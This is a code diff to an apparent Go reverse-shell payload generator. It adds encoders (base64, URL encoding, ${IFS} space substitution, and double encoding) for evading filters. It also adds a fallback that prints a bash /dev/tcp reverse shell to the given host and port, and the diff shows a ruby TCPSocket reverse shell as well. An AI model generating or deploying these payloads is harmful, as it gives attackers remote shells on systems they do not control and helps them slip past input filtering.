@@ -1,17 +1,21 @@
 package main
 
 import (
+	"encoding/base64"
 	"flag"
-	"fmt"
+	"net/url"
 	"os"
+	"strings"
 )
 
 type pbuild struct {
-	payload string
-	version string
-	host   string
-	port   string
-	os     string
+	payload  string
+	version  string
+	host     string
+	port     string
+	os       string
+	encoding string
+	shlldone string
 }
 
 func (c pbuild)shells() string {
@@ -88,17 +92,35 @@ func (c pbuild)shells() string {
 		} else if c.os == "windows" {
 			s = `ruby -rsocket -e 'c=TCPSocket.new("`+c.host+`","`+c.port+`");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`
 		}
+	} else {
+		s = "Payload was not found, take this: bash -c 'exec bash -i &>/dev/tcp/"+c.host+"/"+c.port+" <&1'"
 	}
 
+	return s
+}
+
+func (ob pbuild)encode() string {
+	var s string
+	if ob.encoding == "base64" {
+		s = base64.StdEncoding.EncodeToString([]byte(ob.shlldone))
+	} else if ob.encoding == "urle" {
+		s = url.QueryEscape(ob.shlldone)
+	} else if ob.encoding == "ifs" {
+		s = strings.Replace(ob.shlldone," ","${IFS}",-1)
+	} else {
+		s = "Encoding was not found: "+ob.shlldone
+	}
 	return s
 }
 
 func main() {
 	var host = flag.String("host","0.0.0.0","Local Host.")
 	var port = flag.String("port","4444","Local Port.")
-	var ops   = flag.String("os","linux","Operating system of the target.")
+	var ops  = flag.String("os","linux","Operating system of the target.")
 	var payl = flag.String("p","bash","Payload to use.")
 	var ver  = flag.String("v","default","Version of payload.")
+	var enc  = flag.String("e","false","Encoding.")
+	var denc = flag.String("de","false","Double Encoding.")
 	var h 	 = flag.Bool("h",false,"Help Menu")
 	flag.Parse()
 
@@ -109,14 +131,27 @@ func main() {
 
 	// New payload
 	nP := new(pbuild)
-	nP.host    = *host
-	nP.port    = *port
-	nP.payload = *payl
-	nP.version = *ver
-	nP.os      = *ops
+	// Setting options.
+	nP.host     = *host
+	nP.port     = *port
+	nP.payload  = *payl
+	nP.version  = *ver
+	nP.os       = *ops
+	nP.encoding = *enc
 
-	fmt.Println(nP.shells())
+	// Build shell.
+	nP.shlldone = nP.shells()
 
+	// Apply encoding.
+	if nP.encoding != "false" {
+		nP.shlldone = nP.encode()
+		if *denc != "false" {
+			nP.encoding = *denc
+			nP.shlldone = nP.encode()
+		}
+	}
+
+	println(nP.shlldone)
 }
 
 func _help() string {
@@ -131,9 +166,12 @@ COMMANDS DESCRIPTION
 -p       Payload.
 -os      Operating system.
 -v       Version of the payload
+-e       Encode.
+-de      Double encoding.
 
 LIST OF PAYLOADS
 ---- -- --------
+-p <options>
 bash
     default - Normal payload.
     tiny    - To put inside of bash files.
@@ -184,5 +222,14 @@ ryby
         default - Normal payload.
     windows
         default - Normal payload.
+
+ENCODING OPTIONS
+-------- -------
+-e <option>
+-de <second encoding>
+base64   - Normal Base64 encoding.
+urle     - URL Encoding.
+ifs      - Replace all spaces to Internal Field Separator.
+
 `
 }
